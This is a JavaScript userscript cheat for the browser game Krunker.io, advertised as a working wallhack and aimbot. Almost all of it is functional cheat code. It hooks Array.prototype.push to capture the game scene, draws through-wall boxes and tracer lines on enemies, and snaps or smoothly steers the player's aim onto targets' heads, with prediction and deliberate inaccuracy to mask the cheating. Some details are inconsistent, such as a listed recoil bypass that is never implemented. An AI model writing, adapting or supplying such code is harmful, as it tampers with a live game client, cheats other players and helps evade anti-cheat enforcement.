(function() {
    'use strict';

    // ==UserScript==
    // @name         Krunker 2025 Working WallHack and Aimbot
    // @version      1.A
    // @description  Includes silent aimbot, ESP, wireframe players, FOV, recoil bypass, wallhack (BETA). Toggle with [O]. Use at your own risk.
    // @author       UKNOWN
    // @license      All Rights Reserved
    // @match        *://krunker.io/*
    // @match        *://browserfps.com/*
    // @run-at       document-start
    // @require      https://cdn.jsdelivr.net/npm/three@0.150.1/build/three.min.js
    // @grant        GM_setValue
    // @grant        GM_getValue
    // ==/UserScript==

    const visualizationPalette = [
        { name: "Crimson", value: "0.86, 0.08, 0.24", style: "color: #dc143c" },
        { name: "Amber", value: "1.0, 0.75, 0.0", style: "color: #ffbf00" },
        { name: "Emerald", value: "0.0, 0.79, 0.34", style: "color: #00c957" },
        { name: "Azure", value: "0.0, 0.5, 1.0", style: "color: #007fff" },
        { name: "Violet", value: "0.54, 0.17, 0.89", style: "color: #8a2be2" },
        { name: "Onyx", value: "0.0, 0.0, 0.0", style: "color: #000000" },
        { name: "Pearl", value: "0.94, 0.94, 0.94", style: "color: #f0f0f0" },
        { name: "Jade", value: "0.0, 0.66, 0.42", style: "color: #00a86b" }
    ];

    const defaultConfig = {
        targetingEnabled: true,
        visualizationEnabled: true,
        trajectoryLines: true,
        visualizationColor: "0.86, 0.08, 0.24",
        visualizationColorIndex: 0,
        verticalAdjustment: 7.5,
        targetingMode: 'crosshairProximity',
        predictionIntensity: 0.85,
        targetingPrecision: 95,
        smoothTargeting: false,
        smoothingFactor: 25,
        uiCollapsed: false,
        lastActivePanel: null
    };

    const config = GM_getValue('krunkerEnhancerConfig', defaultConfig);

    const keyBindings = {
        KeyB: 'targetingEnabled',
        KeyN: 'visualizationEnabled',
        KeyM: 'trajectoryLines',
        KeyC: 'cycleVisualizationColor',
        BracketLeft: 'decreaseVerticalAdjustment',
        BracketRight: 'increaseVerticalAdjustment',
        Digit2: 'toggleTargetingMode',
        Digit3: 'smoothTargeting',
        Backslash: 'toggleUI'
    };

    const featureDescriptions = {
        targetingEnabled: "Targeting System [B]",
        visualizationEnabled: "Visualization [N]",
        trajectoryLines: "Trajectory Lines [M]",
        targetingMode: "Targeting Mode [2]",
        predictionIntensity: "Prediction Strength",
        targetingPrecision: "Targeting Precision",
        smoothTargeting: "Smooth Targeting [3]",
        smoothingFactor: "Smoothing Factor",
        visualizationColor: "Color Scheme [C]",
        verticalAdjustment: "Vertical Adjustment"
    };

    let sceneContext;
    let initializationTimer = null;
    let rightMouseActive = false;
    let targetLockActive = false;
    let lockedTarget = null;
    let targetPositionHistory = {};
    let lastTargetingTime = 0;

    const ThreeDEngine = window.THREE;
    delete window.THREE;

    const systemUtils = {
        window: window,
        document: document,
        querySelector: document.querySelector,
        log: console.log,
        arrayProto: Array.prototype,
        arrayPush: Array.prototype.push,
        requestFrame: window.requestAnimationFrame,
        setTimeout: window.setTimeout
    };

    systemUtils.log('Initializing precision enhancement system...');

    const sceneDetector = function(object) {
        try {
            if (typeof object === 'object' &&
                typeof object.parent === 'object' &&
                object.parent.type === 'Scene' &&
                object.parent.name === 'Main') {
                systemUtils.log('Scene context acquired');
                sceneContext = object.parent;
                systemUtils.arrayProto.push = systemUtils.arrayPush;
            }
        } catch (error) {}
        return systemUtils.arrayPush.apply(this, arguments);
    };

    const vectorCache1 = new ThreeDEngine.Vector3();
    const vectorCache2 = new ThreeDEngine.Vector3();
    const tempTransform = new ThreeDEngine.Object3D();
    tempTransform.rotation.order = 'YXZ';

    const playerGeometry = new ThreeDEngine.EdgesGeometry(
        new ThreeDEngine.BoxGeometry(4.8, 14.8, 4.8).translate(0, 7.4, 0)
    );

    let visualizationMaterial = new ThreeDEngine.RawShaderMaterial({
        vertexShader: `
            attribute vec3 position;
            uniform mat4 projectionMatrix;
            uniform mat4 modelViewMatrix;
            void main() {
                gl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);
                gl_Position.z = 1.0;
            }
        `,
        fragmentShader: `
            void main() {
                gl_FragColor = vec4(${config.visualizationColor}, 1.0);
            }
        `
    });

    const trajectoryVisual = new ThreeDEngine.LineSegments(
        new ThreeDEngine.BufferGeometry(),
        visualizationMaterial
    );
    trajectoryVisual.frustumCulled = false;
    const trajectoryPositions = new ThreeDEngine.BufferAttribute(
        new Float32Array(100 * 2 * 3),
        3
    );
    trajectoryVisual.geometry.setAttribute('position', trajectoryPositions);

    function updateVisualizationColor() {
        config.visualizationColorIndex =
            (config.visualizationColorIndex + 1) % visualizationPalette.length;
        const newColor = visualizationPalette[config.visualizationColorIndex];
        config.visualizationColor = newColor.value;

        visualizationMaterial = new ThreeDEngine.RawShaderMaterial({
            vertexShader: `
                attribute vec3 position;
                uniform mat4 projectionMatrix;
                uniform mat4 modelViewMatrix;
                void main() {
                    gl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);
                    gl_Position.z = 1.0;
                }
            `,
            fragmentShader: `
                void main() {
                    gl_FragColor = vec4(${config.visualizationColor}, 1.0);
                }
            `
        });

        trajectoryVisual.material = visualizationMaterial;

        if (sceneContext && sceneContext.children) {
            for (let i = 0; i < sceneContext.children.length; i++) {
                const entity = sceneContext.children[i];
                if (entity.visualizationBox) {
                    entity.visualizationBox.material = visualizationMaterial;
                }
            }
        }

        const colorDisplay = document.querySelector(
            '[data-config-key="visualizationColor"] .value-display'
        );
        if (colorDisplay) {
            colorDisplay.textContent = newColor.name;
            colorDisplay.style = newColor.style;
        }

        saveConfiguration();
    }

    function restoreDefaultConfiguration() {
        Object.assign(config, defaultConfig);
        saveConfiguration();
        updateInterfaceConfiguration();
    }

    function handlePointerDown(e) {
        if (e.button === 2) {
            rightMouseActive = true;
            targetLockActive = false;
            lockedTarget = null;
        }
    }

    function handlePointerUp(e) {
        if (e.button === 2) {
            rightMouseActive = false;
            targetLockActive = false;
            lockedTarget = null;
        }
    }

    function saveConfiguration() {
        GM_setValue('krunkerEnhancerConfig', config);
    }

    function toggleConfiguration(key) {
        config[key] = !config[key];
        const itemElement = document.querySelector(`[data-config-key="${key}"]`);
        if (itemElement) {
            const valueElement = itemElement.querySelector('.value-display');
            valueElement.textContent = config[key] ? 'ON' : 'OFF';
            valueElement.style.color = config[key] ? '#4fc3f7' : '#F44336';
        }
        saveConfiguration();
    }

    function switchTargetingMode() {
        config.targetingMode = config.targetingMode === 'crosshairProximity'
            ? 'distanceProximity'
            : 'crosshairProximity';
        const modeElement = document.querySelector('[data-config-key="targetingMode"]');
        if (modeElement) {
            const valueElement = modeElement.querySelector('.value-display');
            valueElement.textContent = config.targetingMode === 'crosshairProximity'
                ? 'Crosshair'
                : 'Distance';
            valueElement.style.color = '#4fc3f7';
        }
        saveConfiguration();
    }

    function toggleInterface() {
        config.uiCollapsed = !config.uiCollapsed;
        updateInterfaceVisibility();
        saveConfiguration();
    }

    function updateVerticalAdjustmentDisplay() {
        const adjustmentInput = document.querySelector('#verticalAdjustmentInput');
        const adjustmentSlider = document.querySelector('#verticalAdjustmentSlider');
        if (adjustmentInput && adjustmentSlider) {
            adjustmentInput.value = config.verticalAdjustment;
            adjustmentSlider.value = config.verticalAdjustment;
        }
    }

    function updateInterfaceConfiguration() {
        Object.keys(config).forEach(key => {
            const itemElement = document.querySelector(`[data-config-key="${key}"]`);
            if (itemElement) {
                const valueElement = itemElement.querySelector('.value-display');
                if (valueElement) {
                    if (key === 'targetingMode') {
                        valueElement.textContent = config[key] === 'crosshairProximity'
                            ? 'Crosshair'
                            : 'Distance';
                        valueElement.style.color = '#4fc3f7';
                    } else if (key === 'visualizationColor') {
                        valueElement.textContent = visualizationPalette[config.visualizationColorIndex].name;
                        valueElement.style = visualizationPalette[config.visualizationColorIndex].style;
                    } else if (typeof config[key] === 'boolean') {
                        valueElement.textContent = config[key] ? 'ON' : 'OFF';
                        valueElement.style.color = config[key] ? '#4fc3f7' : '#F44336';
                    }
                }
            }
        });

        const verticalAdjustmentInput = document.querySelector('#verticalAdjustmentInput');
        const verticalAdjustmentSlider = document.querySelector('#verticalAdjustmentSlider');
        if (verticalAdjustmentInput && verticalAdjustmentSlider) {
            verticalAdjustmentInput.value = config.verticalAdjustment;
            verticalAdjustmentSlider.value = config.verticalAdjustment;
        }

        const predictionInput = document.querySelector('#predictionInput');
        const predictionSlider = document.querySelector('#predictionSlider');
        if (predictionInput && predictionSlider) {
            predictionInput.value = Math.round(config.predictionIntensity * 100);
            predictionSlider.value = config.predictionIntensity;
        }

        const precisionInput = document.querySelector('#precisionInput');
        const precisionSlider = document.querySelector('#precisionSlider');
        if (precisionInput && precisionSlider) {
            precisionInput.value = config.targetingPrecision;
            precisionSlider.value = config.targetingPrecision;
        }

        const smoothingInput = document.querySelector('#smoothingInput');
        const smoothingSlider = document.querySelector('#smoothingSlider');
        if (smoothingInput && smoothingSlider) {
            smoothingInput.value = config.smoothingFactor;
            smoothingSlider.value = config.smoothingFactor;
        }

        const interfaceElement = document.querySelector('.nexus-interface');
        if (interfaceElement) {
            if (config.uiCollapsed) {
                interfaceElement.classList.remove('expanded');
            } else {
                interfaceElement.classList.add('expanded');
            }
        }

        if (config.lastActivePanel) {
            const panelElement = document.querySelector(
                `.panel-header:contains("${config.lastActivePanel}")`
            );
            if (panelElement) {
                panelElement.parentElement.classList.add('active');
            }
        }
    }

    function updateInterfaceVisibility() {
        const interfaceElement = document.querySelector('.nexus-interface');
        if (interfaceElement) {
            if (config.uiCollapsed) {
                interfaceElement.classList.remove('expanded');
                interfaceElement.querySelector('.interface-status').textContent = '';
            } else {
                interfaceElement.classList.add('expanded');
                interfaceElement.querySelector('.interface-status').textContent = '';
            }
        }
    }

    function initializeInterface() {
        const interfaceContainer = document.createElement('div');
        interfaceContainer.innerHTML = `
            <style>
                .nexus-interface {
                    position: fixed;
                    right: 10px;
                    top: 100px;
                    z-index: 999;
                    display: flex;
                    flex-direction: column;
                    font-family: 'Tahoma', sans-serif;
                    font-size: 13px;
                    color: #e0e0e0;
                    width: 260px;
                    user-select: none;
                    border: 1px solid #1a3a5a;
                    background: rgba(15, 15, 30, 0.9);
                    box-shadow: 0 0 15px rgba(0, 0, 0, 0.7);
                    border-radius: 5px;
                    overflow: hidden;
                }

                .interface-header {
                    padding: 8px 12px;
                    background: linear-gradient(to right, #0a1a2f, #142a45);
                    cursor: move;
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    border-bottom: 1px solid #1a3a5a;
                }

                .interface-title {
                    font-size: 14px;
                    font-weight: bold;
                    color: #4fc3f7;
                    text-shadow: 0 0 5px rgba(79, 195, 247, 0.5);
                }

                .interface-status {
                    font-size: 12px;
                    color: #64b5f6;
                }

                .interface-content {
                    display: none;
                    flex-direction: column;
                }

                .nexus-interface.expanded .interface-content {
                    display: flex;
                }

                .panel {
                    margin: 5px;
                    border: 1px solid #1a3a5a;
                    background: rgba(15, 25, 40, 0.7);
                    border-radius: 3px;
                    overflow: hidden;
                }

                .panel-header {
                    padding: 7px 12px;
                    background: linear-gradient(to right, #0a1a2f, #142a45);
                    cursor: pointer;
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                }

                .panel-header:hover {
                    background: linear-gradient(to right, #0c2038, #183252);
                }

                .panel-title {
                    font-weight: bold;
                    color: #4fc3f7;
                }

                .panel-arrow {
                    transition: transform 0.2s;
                    color: #64b5f6;
                }

                .panel.active .panel-arrow {
                    transform: rotate(90deg);
                }

                .panel-content {
                    display: none;
                    flex-direction: column;
                }

                .panel.active .panel-content {
                    display: flex;
                }

                .control-item {
                    padding: 7px 12px;
                    display: flex;
                    flex-direction: column;
                    background: rgba(20, 30, 45, 0.7);
                    border-bottom: 1px solid #1a3a5a;
                }

                .control-item:last-child {
                    border-bottom: none;
                }

                .control-label {
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    margin-bottom: 5px;
                }

                .control-name {
                    font-weight: bold;
                    color: #bbdefb;
                }

                .value-display {
                    font-size: 12px;
                    font-weight: bold;
                }

                .control-inputs {
                    display: flex;
                    flex-direction: column;
                    gap: 5px;
                }

                .slider-container {
                    display: flex;
                    align-items: center;
                    gap: 8px;
                }

                .slider-container input[type="range"] {
                    flex-grow: 1;
                    -webkit-appearance: none;
                    height: 4px;
                    background: #0c2038;
                    outline: none;
                    border-radius: 2px;
                }

                .slider-container input[type="range"]::-webkit-slider-thumb {
                    -webkit-appearance: none;
                    appearance: none;
                    width: 12px;
                    height: 12px;
                    background: #4fc3f7;
                    cursor: pointer;
                    border-radius: 50%;
                }

                .slider-container input[type="number"] {
                    width: 50px;
                    text-align: center;
                    background: #0c2038;
                    border: 1px solid #1a3a5a;
                    color: #fff;
                    padding: 2px;
                    font-size: 12px;
                    border-radius: 2px;
                }

                .action-button {
                    padding: 7px 12px;
                    background: #142a45;
                    text-align: center;
                    cursor: pointer;
                    border: 1px solid #1a3a5a;
                    margin: 5px;
                    color: #4fc3f7;
                    border-radius: 3px;
                    transition: background 0.2s;
                }

                .action-button:hover {
                    background: #1c3c5e;
                }
            </style>
            <div class="nexus-interface ${config.uiCollapsed ? '' : 'expanded'}">
                <div class="interface-header">
                    <span class="interface-title">NexusCore Pro</span>
                    <span class="interface-status">[${config.uiCollapsed ? '+' : '-'}]</span>
                </div>
                <div class="interface-content">
                    <div class="panel ${config.lastActivePanel === 'Targeting System' ? 'active' : ''}">
                        <div class="panel-header">
                            <span class="panel-title">Système de Ciblage</span>
                            <span class="panel-arrow">▶</span>
                        </div>
                        <div class="panel-content">
                            <div class="control-item" data-config-key="targetingEnabled">
                                <div class="control-label">
                                    <span class="control-name">${featureDescriptions.targetingEnabled}</span>
                                    <span class="value-display" style="color: ${config.targetingEnabled ? '#4fc3f7' : '#f44336'}">${config.targetingEnabled ? 'ON' : 'OFF'}</span>
                                </div>
                            </div>

                            <div class="control-item" data-config-key="targetingMode">
                                <div class="control-label">
                                    <span class="control-name">${featureDescriptions.targetingMode}</span>
                                    <span class="value-display" style="color: #4fc3f7">${config.targetingMode === 'crosshairProximity' ? 'Crosshair' : 'Distance'}</span>
                                </div>
                            </div>

                            <div class="control-item" data-config-key="smoothTargeting">
                                <div class="control-label">
                                    <span class="control-name">${featureDescriptions.smoothTargeting}</span>
                                    <span class="value-display" style="color: ${config.smoothTargeting ? '#4fc3f7' : '#f44336'}">${config.smoothTargeting ? 'ON' : 'OFF'}</span>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="panel ${config.lastActivePanel === 'Visualization' ? 'active' : ''}">
                        <div class="panel-header">
                            <span class="panel-title">Visualisation</span>
                            <span class="panel-arrow">▶</span>
                        </div>
                        <div class="panel-content">
                            <div class="control-item" data-config-key="visualizationEnabled">
                                <div class="control-label">
                                    <span class="control-name">${featureDescriptions.visualizationEnabled}</span>
                                    <span class="value-display" style="color: ${config.visualizationEnabled ? '#4fc3f7' : '#f44336'}">${config.visualizationEnabled ? 'ON' : 'OFF'}</span>
                                </div>
                            </div>

                            <div class="control-item" data-config-key="trajectoryLines">
                                <div class="control-label">
                                    <span class="control-name">${featureDescriptions.trajectoryLines}</span>
                                    <span class="value-display" style="color: ${config.trajectoryLines ? '#4fc3f7' : '#f44336'}">${config.trajectoryLines ? 'ON' : 'OFF'}</span>
                                </div>
                            </div>

                            <div class="control-item" data-config-key="visualizationColor">
                                <div class="control-label">
                                    <span class="control-name">${featureDescriptions.visualizationColor}</span>
                                    <span class="value-display" style="${visualizationPalette[config.visualizationColorIndex].style}">${visualizationPalette[config.visualizationColorIndex].name}</span>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="panel ${config.lastActivePanel === 'Configuration' ? 'active' : ''}">
                        <div class="panel-header">
                            <span class="panel-title">Paramètres</span>
                            <span class="panel-arrow">▶</span>
                        </div>
                        <div class="panel-content">
                            <div class="control-item">
                                <div class="control-label">
                                    <span class="control-name">${featureDescriptions.predictionIntensity}</span>
                                </div>
                                <div class="control-inputs">
                                    <div class="slider-container">
                                        <input type="range" id="predictionSlider" min="0" max="1" step="0.01" value="${config.predictionIntensity}">
                                        <input type="number" id="predictionInput" value="${Math.round(config.predictionIntensity * 100)}" min="0" max="100" step="1">
                                    </div>
                                </div>
                            </div>

                            <div class="control-item">
                                <div class="control-label">
                                    <span class="control-name">${featureDescriptions.targetingPrecision}</span>
                                </div>
                                <div class="control-inputs">
                                    <div class="slider-container">
                                        <input type="range" id="precisionSlider" min="1" max="100" step="1" value="${config.targetingPrecision}">
                                        <input type="number" id="precisionInput" value="${config.targetingPrecision}" min="1" max="100" step="1">
                                    </div>
                                </div>
                            </div>

                            <div class="control-item">
                                <div class="control-label">
                                    <span class="control-name">${featureDescriptions.smoothingFactor}</span>
                                </div>
                                <div class="control-inputs">
                                    <div class="slider-container">
                                        <input type="range" id="smoothingSlider" min="1" max="100" step="1" value="${config.smoothingFactor}">
                                        <input type="number" id="smoothingInput" value="${config.smoothingFactor}" min="1" max="100" step="1">
                                    </div>
                                </div>
                            </div>

                            <div class="control-item">
                                <div class="control-label">
                                    <span class="control-name">${featureDescriptions.verticalAdjustment}</span>
                                </div>
                                <div class="control-inputs">
                                    <div class="slider-container">
                                        <input type="range" id="verticalAdjustmentSlider" min="-50" max="50" step="0.25" value="${config.verticalAdjustment}">
                                        <input type="number" id="verticalAdjustmentInput" value="${config.verticalAdjustment}" min="-50" max="50" step="0.25">
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="panel">
                        <div class="panel-header">
                            <span class="panel-title">Système</span>
                            <span class="panel-arrow">▶</span>
                        </div>
                        <div class="panel-content">
                            <div class="action-button" id="resetSettings">
                                Réinitialiser Tous les Paramètres
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        `;

        const panelHeaders = interfaceContainer.querySelectorAll('.panel-header');
        panelHeaders.forEach(header => {
            header.addEventListener('click', function() {
                const panel = this.parentElement;
                const wasActive = panel.classList.contains('active');

                document.querySelectorAll('.panel').forEach(p => {
                    p.classList.remove('active');
                });

                if (!wasActive) {
                    panel.classList.add('active');
                    config.lastActivePanel = this.querySelector('.panel-title').textContent;
                    saveConfiguration();
                } else {
                    config.lastActivePanel = null;
                    saveConfiguration();
                }
            });
        });

        const predictionSlider = interfaceContainer.querySelector('#predictionSlider');
        const predictionInput = interfaceContainer.querySelector('#predictionInput');
        if (predictionSlider && predictionInput) {
            predictionSlider.addEventListener('input', function() {
                config.predictionIntensity = parseFloat(this.value);
                predictionInput.value = Math.round(config.predictionIntensity * 100);
                saveConfiguration();
            });

            predictionInput.addEventListener('change', function() {
                const value = parseFloat(this.value);
                if (!isNaN(value)) {
                    const clampedValue = Math.max(0, Math.min(100, value));
                    config.predictionIntensity = clampedValue / 100;
                    predictionSlider.value = config.predictionIntensity;
                    this.value = clampedValue;
                    saveConfiguration();
                } else {
                    this.value = Math.round(config.predictionIntensity * 100);
                }
            });
        }

        const precisionSlider = interfaceContainer.querySelector('#precisionSlider');
        const precisionInput = interfaceContainer.querySelector('#precisionInput');
        if (precisionSlider && precisionInput) {
            precisionSlider.addEventListener('input', function() {
                config.targetingPrecision = parseInt(this.value);
                precisionInput.value = config.targetingPrecision;
                saveConfiguration();
            });

            precisionInput.addEventListener('change', function() {
                const value = parseInt(this.value);
                if (!isNaN(value)) {
                    const clampedValue = Math.max(1, Math.min(100, value));
                    config.targetingPrecision = clampedValue;
                    precisionSlider.value = clampedValue;
                    this.value = clampedValue;
                    saveConfiguration();
                } else {
                    this.value = config.targetingPrecision;
                }
            });
        }

        const smoothingSlider = interfaceContainer.querySelector('#smoothingSlider');
        const smoothingInput = interfaceContainer.querySelector('#smoothingInput');
        if (smoothingSlider && smoothingInput) {
            smoothingSlider.addEventListener('input', function() {
                config.smoothingFactor = parseInt(this.value);
                smoothingInput.value = config.smoothingFactor;
                saveConfiguration();
            });

            smoothingInput.addEventListener('change', function() {
                const value = parseInt(this.value);
                if (!isNaN(value)) {
                    const clampedValue = Math.max(1, Math.min(100, value));
                    config.smoothingFactor = clampedValue;
                    smoothingSlider.value = clampedValue;
                    this.value = clampedValue;
                    saveConfiguration();
                } else {
                    this.value = config.smoothingFactor;
                }
            });
        }

        const verticalAdjustmentSlider = interfaceContainer.querySelector('#verticalAdjustmentSlider');
        const verticalAdjustmentInput = interfaceContainer.querySelector('#verticalAdjustmentInput');
        if (verticalAdjustmentSlider && verticalAdjustmentInput) {
            verticalAdjustmentSlider.addEventListener('input', function() {
                config.verticalAdjustment = parseFloat(this.value);
                verticalAdjustmentInput.value = config.verticalAdjustment;
                saveConfiguration();
            });

            verticalAdjustmentInput.addEventListener('change', function() {
                const value = parseFloat(this.value);
                if (!isNaN(value)) {
                    const clampedValue = Math.max(-50, Math.min(50, value));
                    config.verticalAdjustment = clampedValue;
                    verticalAdjustmentSlider.value = clampedValue;
                    this.value = clampedValue;
                    saveConfiguration();
                } else {
                    this.value = config.verticalAdjustment;
                }
            });
        }

        const resetButton = interfaceContainer.querySelector('#resetSettings');
        if (resetButton) {
            resetButton.addEventListener('click', restoreDefaultConfiguration);
        }

        const interfaceHeader = interfaceContainer.querySelector('.interface-header');
        let isDragging = false;
        let startX, startY, initialX, initialY;

        interfaceHeader.addEventListener('mousedown', function(e) {
            if (e.button === 0) {
                isDragging = true;
                startX = e.clientX;
                startY = e.clientY;
                const rect = interfaceContainer.querySelector('.nexus-interface').getBoundingClientRect();
                initialX = rect.left;
                initialY = rect.top;
                document.addEventListener('mousemove', onMouseMove);
                document.addEventListener('mouseup', onMouseUp);
            }
        });

        function onMouseMove(e) {
            if (!isDragging) return;

            const dx = e.clientX - startX;
            const dy = e.clientY - startY;

            let newX = initialX + dx;
            let newY = initialY + dy;

            const maxX = window.innerWidth - interfaceContainer.querySelector('.nexus-interface').offsetWidth;
            const maxY = window.innerHeight - interfaceContainer.querySelector('.nexus-interface').offsetHeight;
            newX = Math.max(0, Math.min(newX, maxX));
            newY = Math.max(0, Math.min(newY, maxY));

            interfaceContainer.querySelector('.nexus-interface').style.left = `${newX}px`;
            interfaceContainer.querySelector('.nexus-interface').style.top = `${newY}px`;
        }

        function onMouseUp() {
            if (isDragging) {
                isDragging = false;
                document.removeEventListener('mousemove', onMouseMove);
                document.removeEventListener('mouseup', onMouseUp);
            }
        }

        document.body.appendChild(interfaceContainer);
        updateInterfaceVisibility();
    }

    function systemLoop() {
        systemUtils.requestFrame.call(systemUtils.window, systemLoop);

        if (!sceneContext && !initializationTimer) {
            const loadingElement = systemUtils.querySelector.call(
                systemUtils.document, '#loadingBg'
            );
            if (loadingElement && loadingElement.style.display === 'none') {
                systemUtils.log('Starting initialization sequence');
                initializationTimer = systemUtils.setTimeout.call(systemUtils.window, () => {
                    systemUtils.log('System injection complete');
                    systemUtils.arrayProto.push = sceneDetector;
                }, 2000);
            }
        }

        if (sceneContext === undefined || !sceneContext.children) return;

        const playerEntities = [];
        let localPlayer;

        for (let i = 0; i < sceneContext.children.length; i++) {
            const entity = sceneContext.children[i];
            if (entity.type === 'Object3D') {
                try {
                    if (entity.children[0].children[0].type === 'PerspectiveCamera') {
                        localPlayer = entity;
                    } else {
                        playerEntities.push(entity);
                    }
                } catch (err) {}
            } else if (entity.material) {
                entity.material.wireframe = false;
            }
        }

        if (!localPlayer) {
            systemUtils.log('Local player not detected, reinitializing...');
            systemUtils.arrayProto.push = sceneDetector;
            return;
        }

        let positionCounter = 0;
        let currentTarget;
        let minimumDistance = Infinity;

        tempTransform.matrix.copy(localPlayer.matrix).invert();

        const currentPositions = {};
        for (let i = 0; i < playerEntities.length; i++) {
            const entity = playerEntities[i];
            currentPositions[entity.id] = entity.position.clone();
        }

        for (let i = 0; i < playerEntities.length; i++) {
            const entity = playerEntities[i];

            if (!entity.visualizationBox) {
                const visualizationBox = new ThreeDEngine.LineSegments(
                    playerGeometry,
                    visualizationMaterial
                );
                visualizationBox.frustumCulled = false;
                entity.add(visualizationBox);
                entity.visualizationBox = visualizationBox;
            }

            if (entity.position.x === localPlayer.position.x &&
                entity.position.z === localPlayer.position.z) {
                entity.visualizationBox.visible = false;
                if (trajectoryVisual.parent !== entity) {
                    entity.add(trajectoryVisual);
                }
                continue;
            }

            trajectoryPositions.setXYZ(positionCounter++, 0, 10, -5);
            vectorCache1.copy(entity.position);
            vectorCache1.y += 9;
            vectorCache1.applyMatrix4(tempTransform.matrix);
            trajectoryPositions.setXYZ(
                positionCounter++,
                vectorCache1.x,
                vectorCache1.y,
                vectorCache1.z
            );

            entity.visible = config.visualizationEnabled || entity.visible;
            entity.visualizationBox.visible = config.visualizationEnabled;

            let predictedPosition = entity.position.clone();
            if (targetPositionHistory[entity.id]) {
                const velocity = new ThreeDEngine.Vector3().subVectors(
                    currentPositions[entity.id],
                    targetPositionHistory[entity.id]
                );
                predictedPosition.add(velocity.multiplyScalar(config.predictionIntensity));
            }

            if (config.targetingMode === 'distanceProximity') {
                const dx = predictedPosition.x - localPlayer.position.x;
                const dy = predictedPosition.y - localPlayer.position.y;
                const dz = predictedPosition.z - localPlayer.position.z;
                const distance = Math.sqrt(dx * dx + dy * dy + dz * dz);

                if (distance < minimumDistance && !targetLockActive) {
                    currentTarget = entity;
                    minimumDistance = distance;
                }
            } else if (config.targetingMode === 'crosshairProximity') {
                vectorCache1.copy(predictedPosition);
                vectorCache1.y += config.verticalAdjustment;

                const viewCamera = localPlayer.children[0].children[0];
                vectorCache1.project(viewCamera);

                const dx = vectorCache1.x;
                const dy = vectorCache1.y;
                const screenDistance = Math.sqrt(dx * dx + dy * dy);

                const playerForward = new ThreeDEngine.Vector3(0, 0, -1)
                    .applyQuaternion(localPlayer.quaternion);
                const toTarget = new ThreeDEngine.Vector3()
                    .subVectors(predictedPosition, localPlayer.position)
                    .normalize();
                const angle = Math.acos(playerForward.dot(toTarget)) * (180 / Math.PI);

                if (screenDistance < minimumDistance &&
                    !targetLockActive &&
                    angle < 90) {
                    currentTarget = entity;
                    minimumDistance = screenDistance;
                }
            }
        }

        targetPositionHistory = currentPositions;

        trajectoryPositions.needsUpdate = true;
        trajectoryVisual.geometry.setDrawRange(0, positionCounter);
        trajectoryVisual.visible = config.trajectoryLines;

        if (!rightMouseActive || !config.targetingEnabled) return;

        if (!targetLockActive) {
            lockedTarget = currentTarget;
            targetLockActive = true;
        }

        if (lockedTarget && !sceneContext.children.includes(lockedTarget)) {
            targetLockActive = false;
            lockedTarget = null;
            return;
        }

        if (lockedTarget === undefined) return;

        const currentTime = performance.now();
        const timeDelta = Math.min(50, currentTime - lastTargetingTime) / 1000;
        lastTargetingTime = currentTime;

        if (lockedTarget.children[0] &&
            lockedTarget.children[0].children[0] &&
            lockedTarget.children[0].children[0].type === 'PerspectiveCamera') {
            const headPosition = new ThreeDEngine.Vector3();
            lockedTarget.children[0].children[0].getWorldPosition(headPosition);

            if (targetPositionHistory[lockedTarget.id]) {
                const velocity = new ThreeDEngine.Vector3().subVectors(
                    currentPositions[lockedTarget.id],
                    targetPositionHistory[lockedTarget.id]
                );
                headPosition.add(velocity.multiplyScalar(config.predictionIntensity));
            }

            const direction = new ThreeDEngine.Vector3()
                .subVectors(headPosition, localPlayer.position)
                .normalize();

            if (config.targetingPrecision < 100) {
                const accuracyFactor = (100 - config.targetingPrecision) / 1000;
                direction.x += (Math.random() * 2 - 1) * accuracyFactor;
                direction.y += (Math.random() * 2 - 1) * accuracyFactor;
                direction.z += (Math.random() * 2 - 1) * accuracyFactor;
                direction.normalize();
            }

            const targetRotation = new ThreeDEngine.Quaternion();
            targetRotation.setFromUnitVectors(new ThreeDEngine.Vector3(0, 0, -1), direction);

            if (config.smoothTargeting) {
                const currentRotation = localPlayer.quaternion.clone();
                const t = Math.min(1, timeDelta * (config.smoothingFactor / 5));

                if (currentRotation.dot(targetRotation) < 0) {
                    targetRotation.negate();
                }

                localPlayer.quaternion.slerp(targetRotation, t);
            } else {
                localPlayer.quaternion.copy(targetRotation);
            }
        } else {
            let predictedPosition = lockedTarget.position.clone();
            if (targetPositionHistory[lockedTarget.id]) {
                const velocity = new ThreeDEngine.Vector3().subVectors(
                    currentPositions[lockedTarget.id],
                    targetPositionHistory[lockedTarget.id]
                );
                predictedPosition.add(velocity.multiplyScalar(config.predictionIntensity));
            }

            vectorCache1.copy(predictedPosition);
            vectorCache1.y += config.verticalAdjustment;
            tempTransform.position.copy(localPlayer.position);
            tempTransform.lookAt(vectorCache1);

            if (config.targetingPrecision < 100) {
                const accuracyFactor = (100 - config.targetingPrecision) / 1000;
                tempTransform.rotation.x += (Math.random() * 2 - 1) * accuracyFactor;
                tempTransform.rotation.y += (Math.random() * 2 - 1) * accuracyFactor;
            }

            if (config.smoothTargeting) {
                const t = Math.min(1, timeDelta * (config.smoothingFactor / 5));

                const currentXRot = localPlayer.children[0].rotation.x;
                const targetXRot = -tempTransform.rotation.x;
                localPlayer.children[0].rotation.x = currentXRot + (targetXRot - currentXRot) * t;

                const currentYRot = localPlayer.rotation.y;
                const targetYRot = tempTransform.rotation.y + Math.PI;

                let diff = targetYRot - currentYRot;
                if (diff > Math.PI) diff -= 2 * Math.PI;
                if (diff < -Math.PI) diff += 2 * Math.PI;

                localPlayer.rotation.y = currentYRot + diff * t;
            } else {
                localPlayer.children[0].rotation.x = -tempTransform.rotation.x;
                localPlayer.rotation.y = tempTransform.rotation.y + Math.PI;
            }
        }
    }

    // Initialize event listeners
    window.addEventListener('DOMContentLoaded', function() {
        initializeInterface();
    });

    // Start the system
    window.addEventListener('pointerdown', handlePointerDown);
    window.addEventListener('pointerup', handlePointerUp);
    window.addEventListener('pointercancel', handlePointerUp);
    window.addEventListener('mouseup', handlePointerUp);
    window.addEventListener('blur', function() {
        rightMouseActive = false;
        targetLockActive = false;
        lockedTarget = null;
    });
    window.addEventListener('contextmenu', function(e) {
        if (e.button === 2) e.preventDefault();
    });

